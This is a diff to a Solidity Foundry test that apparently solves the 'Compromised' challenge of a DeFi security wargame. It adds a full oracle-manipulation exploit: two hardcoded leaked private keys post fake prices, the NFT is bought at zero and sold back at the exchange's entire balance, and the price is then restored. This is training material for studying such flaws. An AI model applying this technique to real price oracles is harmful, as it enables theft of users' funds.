@@ -17,6 +17,8 @@ contract Compromised is Test {
     TrustfulOracleInitializer internal trustfulOracleInitializer;
     DamnValuableNFT internal damnValuableNFT;
     address payable internal attacker;
+    address payable internal privateKeyOne;
+    address payable internal privateKeyTwo;
 
     function setUp() public {
         address[] memory sources = new address[](3);
@@ -76,6 +78,61 @@ contract Compromised is Test {
         /**
          * EXPLOIT START *
          */
+
+        //log median price
+        uint256 priceBefore = trustfulOracle.getMedianPrice("DVNFT");
+        console.log("Price before:", priceBefore);
+
+        uint256 privakeyOne = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
+        address addrOne = vm.addr(privakeyOne);
+        vm.label(addrOne, "Sinful Price setter 850c");
+        vm.deal(addrOne, 0.1 ether);
+
+        uint256 privakeyTwo = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
+        address addrTwo = vm.addr(privakeyTwo);
+        vm.label(addrTwo, "Sinful Price setter 9d15");
+        vm.deal(addrTwo, 0.1 ether);
+
+        vm.startPrank(addrOne);
+        trustfulOracle.postPrice("DVNFT", 0 ether);
+        vm.stopPrank();
+
+        vm.startPrank(addrTwo);
+        trustfulOracle.postPrice("DVNFT", 0 ether);
+        vm.stopPrank();
+
+        uint256 priceAfter = trustfulOracle.getMedianPrice("DVNFT");
+        console.log("Price After:", priceAfter);
+
+        vm.startPrank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 0.1 ether}();
+        vm.stopPrank();
+
+        vm.startPrank(addrOne);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        vm.startPrank(addrTwo);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        vm.startPrank(attacker);
+
+        exchange.token().approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+
+        vm.stopPrank();
+
+        vm.startPrank(addrOne);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        vm.startPrank(addrTwo);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        //log the attacker balance of eth
+        console.log("Attacker balance:", attacker.balance);
 
         /**
          * EXPLOIT END *
